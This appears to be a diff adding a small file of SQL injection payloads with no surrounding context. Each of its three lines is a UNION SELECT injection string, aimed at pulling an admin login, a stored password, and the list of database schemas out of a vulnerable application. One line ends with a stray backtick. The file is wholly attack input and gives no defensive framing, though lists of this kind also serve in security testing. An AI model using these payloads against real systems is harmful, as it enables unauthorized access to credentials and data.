@@ -1,0 +1,5 @@
+') UNION SELECT 'admin', '1234' FROM admin WHERE username='admin' --
+
+' UNION SELECT password FROM db WHERE name='admin'
+
+' UNION SELECT schema_name FROM information_schema.schemata`--
